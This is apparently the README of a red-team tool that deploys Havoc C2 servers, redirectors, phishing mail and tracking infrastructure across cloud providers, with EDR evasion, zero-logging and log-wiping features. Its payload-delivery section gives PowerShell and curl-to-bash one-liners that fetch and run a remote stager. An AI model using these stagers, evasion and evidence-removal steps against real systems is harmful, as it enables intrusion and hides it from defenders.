# C2ingRed

A comprehensive automated deployment system for Havoc C2 red team infrastructure.

## Overview

C2ingRed enables rapid deployment of complete Command and Control (C2) infrastructure with advanced security hardening, EDR evasion capabilities, and operational security features. Built for professional red team operators, this tool uses Infrastructure as Code principles to efficiently set up Havoc C2 servers, redirectors, and additional components.

## Features

- **Multi-provider Support**: AWS, Linode, and FlokiNET
- **Infrastructure Components**:
  - C2 server with Havoc C2 Framework (dev branch)
  - HTTPS redirectors with security hardening
  - Email infrastructure with DKIM/DMARC for phishing
  - Email tracking capabilities
  - Automated payload generation and delivery
  - Attack boxes (Kali Linux and custom Ubuntu)
  - **Quick Recon Box** - Streamlined reconnaissance platform (5-8 min deployment)
- **Security Features**:
  - Zero-logging configuration to minimize evidence
  - Memory protection mechanisms
  - Command history suppression
  - Secure exfiltration tunnels
  - Strong firewall configurations
  - Fail2Ban and other defensive measures
- **EDR Evasion**:
  - Sleep masking
  - Stack spoofing
  - AMSI/ETW patching
  - Indirect syscalls
  - Binary signature randomization
- **Operational Capabilities**:
  - Automated post-exploitation payload building
  - Reverse shell handler with automatic agent deployment
  - Let's Encrypt SSL certificate automation
  - Payload synchronization between C2 and redirectors
  - Port randomization for OPSEC

## Requirements

- Python 3.6+
- Ansible 2.9+
- Provider-specific credentials:
  - AWS: Access and secret keys
  - Linode: API token
  - FlokiNET: Pre-provisioned servers
- SSH keypair for server access
- Registered domain (required for Let's Encrypt certificates)

## Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/C2ingRed.git
cd C2ingRed

# Install requirements
pip install -r requirements.txt

# Ensure Ansible is installed
ansible --version
```

## Usage

### Azure infrastructure-only VM

The Azure flow and its smoke-test script require Python 3.12 or newer.

Choose **Tools & Utilities → Infrastructure-only VM (Azure)**, or run
`python3 modules/infrastructure/deploy_infrastructure.py`. Azure is offered only
for this flow. It creates a dedicated resource group, network, firewall, static
Standard IPv4, NIC and Ubuntu 24.04 VM with a 32-GiB StandardSSD managed disk.
SSH is allowed only from your public IPv4 /32, password login is disabled, and
normal system logs and managed boot diagnostics remain enabled.

Use an authenticated Azure CLI session (`az login`) and supply the subscription,
region, VM size and SSH public key explicitly. No Azure SDK package is required;
the localhost Ansible playbooks use the installed Azure CLI. Register
`Microsoft.Compute` and `Microsoft.Network` and check regional quota, policy,
image and SKU availability before deploying. See
`providers/Azure/vars.example.yaml` for non-secret configuration. The controller
does not pass other providers' credentials into Azure tasks.

Deployment intent is saved atomically with owner-only permissions under
`deployments/azure/<deployment_id>.json` before cloud creation. Repeat a deployment
with the same configuration to update its resources. Recovery uses
`python3 modules/infrastructure/deploy_infrastructure.py --teardown-id <deployment_id>`;
the same module's `--teardown-all` and main Cleanup menu also discover
these files independently of legacy logs. Cleanup refuses foreign groups and
unexpected resources, cancels active ARM provisioning, and confirms group deletion
before removing only keys generated for that deployment. Keep failed state files
for recovery; successful state is retained in `deployments/azure/archive/`.

Preview the reviewed live smoke with `python3 deploy.py --deploy --azure-smoke --dry-run`.
Run `python3 scripts/deploy_azure_smoke.py --prepare` for the reviewed commit, push,
artifact, registration and preflight steps without creating a resource group or VM.
Preparation cleans its generated key and records a preparation result; it does not
report a passed live test. Run the actual test with
`python3 deploy.py --deploy --azure-smoke --activate`, which repeats all preconditions.
Activation commits approved paths through hooks, pushes and verifies
`forgejo/public`, archives the committed source, checks a new empty target, and
tests one temporary VM in East US before cleanup. Live defaults are subscription
`cc2a66d1-67c2-47ca-856f-19a4eae52cfe` and `Standard_D2as_v4`; the script stops on
quota, image, SKU or policy failure. SSH uses a dedicated known_hosts file and
explicit `accept-new` trust on first use; changed keys are rejected. Provisioning
and validation have a 30-minute deadline, with a separate 10-minute cleanup budget.
SIGINT/SIGTERM stop controller children and trigger cleanup; SIGKILL or workstation
loss can leave resources that require the persisted-state recovery command.
Provider registrations remain enabled after the test.

### Main Menu (Easiest Method)

Simply run:
```bash
python3 deploy.py
```

This launches the interactive main menu for deployment, providing the most user-friendly experience with guided options for all infrastructure types.

### Interactive Mode

Alternatively, you can use:
```bash
./deploy.py --interactive
```

This guides you through the deployment process with step-by-step instructions.

### Command-line Deployment

#### AWS Deployment:
```bash
./deploy.py --provider aws --aws-key YOUR_KEY --aws-secret YOUR_SECRET \
            --domain your-domain.com --aws-region us-east-1
```

#### Linode Deployment:
```bash
./deploy.py --provider linode --linode-token YOUR_TOKEN \
            --domain your-domain.com --linode-region us-east
```

#### FlokiNET Deployment (with pre-provisioned servers):
```bash
./deploy.py --provider flokinet --flokinet-redirector-ip YOUR_REDIRECTOR_IP \
            --flokinet-c2-ip YOUR_C2_IP --domain your-domain.com
```

### Deployment Options

| Option | Description |
|--------|-------------|
| `--redirector-only` | Deploy only the redirector component |
| `--c2-only` | Deploy only the C2 server component |
| `--deploy-tracker` | Deploy email tracking server |
| `--integrated-tracker` | Setup tracker on C2 server instead of separate instance |
| `--disable-history` | Disable command history on servers |
| `--secure-memory` | Enable secure memory protection features |
| `--zero-logs` | Configure zero-logging throughout infrastructure |
| `--randomize-ports` | Use randomized ports for C2 communications |
| `--ssh-after-deploy` | Automatically SSH into the server after deployment |

## Post-Deployment Steps

After successful deployment:

1. Configure DNS records for your domain:
   - `your-domain.com` → C2 server
   - `mail.your-domain.com` → C2 server
   - `cdn.your-domain.com` → Redirector (or your custom subdomain)
   - `track.your-domain.com` → Tracker (if deployed)

2. Run post-install scripts on each server:
   ```bash
   # On C2 server
   /root/Tools/post_install_c2.sh
   
   # On redirector
   /root/Tools/post_install_redirector.sh
   ```

3. Generate Havoc C2 payloads:
   ```bash
   # On C2 server
   /root/Tools/generate_havoc_payloads.sh
   ```

## Using Havoc C2

Havoc C2 Framework is installed at `/root/Tools/Havoc` on the C2 server.

### Connecting to the Teamserver

From your local machine:

```bash
# Install Havoc client (development branch)
git clone -b dev https://github.com/HavocFramework/Havoc.git
cd Havoc/Client
mkdir build && cd build
cmake -GNinja ..
ninja

# Connect to Teamserver
./havoc client --address YOUR_C2_IP:40056 --username admin --password [password]
```

The password is stored in `/root/Tools/Havoc/data/profiles/default.yaotl` on the C2 server.

### Payload Delivery

PowerShell one-liner for Windows targets:
```powershell
powershell -exec bypass -c "iex(New-Object Net.WebClient).DownloadString('https://cdn.your-domain.com/windows_stager.ps1')"
```

Linux one-liner:
```bash
curl -s https://cdn.your-domain.com/linux_stager.sh | bash
```

## Security Considerations

- All servers include the `/root/Tools/secure-exit.sh` script to securely wipe operational data
- The `/root/Tools/clean-logs.sh` script automatically runs to remove evidence
- Port randomization enhances OPSEC when enabled
- Set proper DKIM/DMARC records for email operations
- Consider using ephemeral infrastructure for high-risk operations

## Cleaning Up

To remove all infrastructure when finished:

```bash
./deploy.py --provider PROVIDER --teardown --deployment-id YOUR_DEPLOYMENT_ID
```

Add your provider-specific authentication arguments to remove the correct resources.

## Disclaimer

This tool is intended for authorized red team operations, penetration testing, and security research only. Always obtain proper authorization before conducting security testing. The authors are not responsible for misuse or illegal activities.
